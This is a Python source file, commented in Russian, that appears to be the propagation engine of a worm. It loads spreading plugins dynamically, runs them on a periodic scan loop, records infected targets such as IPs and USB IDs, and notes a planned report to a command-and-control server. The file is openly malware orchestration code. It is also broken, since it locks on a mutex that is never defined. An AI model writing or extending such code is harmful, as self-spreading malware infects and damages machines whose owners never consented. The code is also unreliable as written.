# Propagation Engine - Управляет модулями распространения (Worm)

import os
import importlib
import platform
import logging
import threading
import time
from typing import Dict, Set, List, Type, Optional

from .interfaces import PropagationPluginBase

logger = logging.getLogger('PropagationEngine')

class PropagationEngine:

    def __init__(self, agent_executable_path: str, target_list: Optional[Set[str]] = None, config: Optional[Dict] = None):
        self.plugins: Dict[str, PropagationPluginBase] = {}
        self.active_plugins: List[PropagationPluginBase] = []
        self.threads: List[threading.Thread] = []
        self.running = False
        self.agent_executable_path = agent_executable_path
        # Список уже атакованных/зараженных целей (IP, USB ID, etc.)
        self.infected_targets: Set[str] = target_list if target_list else set()
        self.config = config if config else {}
        self.scan_interval = self.config.get("scan_interval", 300) # Интервал между запусками сканирования (сек)
        # Проверяем тип интервала
        if not isinstance(self.scan_interval, int) or self.scan_interval <= 0:
             logger.warning(f"Invalid scan_interval '{self.scan_interval}', using default 300 seconds.")
             self.scan_interval = 300
        self.plugin_configs = self.config.get("plugins", {}) # Конфиги для плагинов

        # Обработка ошибок при загрузке плагинов
        try:
            self._load_plugins()
        except Exception as e:
             logger.error(f"Failed to load propagation plugins during init: {e}", exc_info=True)

    def _load_plugins(self):
        """Динамически загружает доступные плагины распространения."""
        plugins_dir = os.path.join(os.path.dirname(__file__), 'plugins')
        logger.info(f"Loading propagation plugins from {plugins_dir}")

        if not os.path.exists(plugins_dir):
             logger.warning(f"Plugins directory not found: {plugins_dir}")
             return

        for filename in os.listdir(plugins_dir):
            if filename.endswith('.py') and not filename.startswith('__'):
                module_name = f"src.modules.worm.plugins.{filename[:-3]}"
                try:
                    module = importlib.import_module(module_name)
                    for attr_name in dir(module):
                        attr = getattr(module, attr_name)
                        if isinstance(attr, type) and issubclass(attr, PropagationPluginBase) and attr is not PropagationPluginBase:
                            try:
                                 # Передаем конфиг плагина при инициализации
                                 plugin_name_candidate = getattr(attr, 'get_name')(None) # Получаем имя для поиска конфига
                                 plugin_config = self.plugin_configs.get(plugin_name_candidate, {}) # type: ignore
                                 instance = attr(plugin_config)
                                 if instance.is_supported():
                                     plugin_name = instance.get_name()
                                     self.plugins[plugin_name] = instance
                                     logger.info(f"Loaded propagation plugin: {plugin_name} ({attr_name})")
                                     # Активируем плагин, если он включен в конфиге
                                     plugin_enabled = plugin_config.get("enabled", True) # Default to True if not specified
                                     if plugin_enabled:
                                         self.active_plugins.append(instance)
                                         logger.info(f"Plugin {plugin_name} activated.")
                                     else:
                                         logger.info(f"Plugin {plugin_name} is disabled by config.")
                                 else:
                                     logger.debug(f"Skipping plugin {attr_name}, not supported on this system.")
                            except Exception as instance_err:
                                 logger.error(f"Failed to instantiate or check support for plugin {attr_name} from {filename}: {instance_err}", exc_info=True)
                except ImportError as import_err:
                    logger.error(f"Failed to import propagation module {module_name}: {import_err}")
                except Exception as e:
                    logger.error(f"Failed to load propagation plugin from {filename}: {e}", exc_info=True)

    def start(self):
        if self.running:
            logger.warning("Propagation engine already running.")
            return
        if not self.agent_executable_path or not os.path.exists(self.agent_executable_path):
             logger.error(f"Cannot start Propagation Engine: Agent executable path invalid or not found: '{self.agent_executable_path}'")
             return

        self.running = True
        logger.info(f"Starting Propagation Engine with {len(self.active_plugins)} active plugins. Scan interval: {self.scan_interval}s.")

        # Запускаем основной цикл в отдельном потоке
        main_loop_thread = threading.Thread(target=self._main_loop, daemon=True, name="PropagationMainLoop")
        self.threads.append(main_loop_thread)
        main_loop_thread.start()

    def stop(self):
        if not self.running:
             return # Уже остановлен
        self.running = False
        logger.info("Stopping Propagation Engine...")
        # Ожидаем завершения главного потока
        # Плагины должны завершиться сами, увидев self.running = False
        for thread in self.threads:
            if thread.name == "PropagationMainLoop" and thread.is_alive():
                 thread.join(timeout=self.scan_interval + 5) # Даем время на завершение цикла
            # Не ждем завершения потоков плагинов напрямую, они daemon
        logger.info("Propagation Engine stopped.")

    def _run_plugin(self, plugin: PropagationPluginBase):
        """Запускает логику плагина (обычно синхронно в этом потоке)."""
        try:
            plugin_name = plugin.get_name()
            logger.info(f"Running plugin: {plugin_name}")
            # Плагин сам должен проверять engine.running при длительных операциях
            plugin.run(self)
            logger.info(f"Plugin {plugin_name} finished execution.")
        except Exception as e:
            logger.error(f"Error running plugin {plugin.get_name()}: {e}", exc_info=True)

    def _main_loop(self):
        """Основной цикл, периодически запускающий активные плагины."""
        while self.running:
            logger.info("Starting propagation cycle...")
            cycle_threads = []
            for plugin in self.active_plugins:
                if not self.running:
                     break # Проверка перед запуском потока
                # Запускаем каждый активный плагин в своем потоке
                plugin_thread = threading.Thread(target=self._run_plugin, args=(plugin,), daemon=True, name=f"WormPlugin_{plugin.get_name()}")
                cycle_threads.append(plugin_thread)
                plugin_thread.start()

            # Ожидаем завершения всех потоков плагинов текущего цикла
            start_time = time.time()
            all_joined = False
            while time.time() - start_time < self.scan_interval * 1.5: # Ждем не дольше 1.5 интервала
                 all_joined = True
                 for thread in cycle_threads:
                      if thread.is_alive():
                           all_joined = False
                           thread.join(timeout=0.5) # Проверяем с таймаутом
                           break # Начинаем проверку заново
                 if all_joined or not self.running:
                      break
                 # time.sleep(0.5) # join уже ждет
            if not all_joined:
                 logger.warning("Propagation cycle timed out waiting for plugins to finish.")

            if not self.running:
                 break

            logger.info(f"Propagation cycle finished. Waiting for {self.scan_interval} seconds.")
            # Ожидание перед следующим циклом с проверкой флага
            for _ in range(self.scan_interval):
                 if not self.running:
                      break
                 time.sleep(1)

    def report_infection(self, target_id: str):
        """Плагин сообщает об успешном заражении цели."""
        # TODO: Отправить информацию на C2?
        with self.mutex: # Защищаем доступ к set
             self.infected_targets.add(target_id)
        logger.info(f"Target reported as infected: {target_id}")

    def should_attack(self, target_id: str) -> bool:
        """Проверяет, стоит ли атаковать цель (не была ли уже заражена)."""
        with self.mutex:
             return target_id not in self.infected_targets 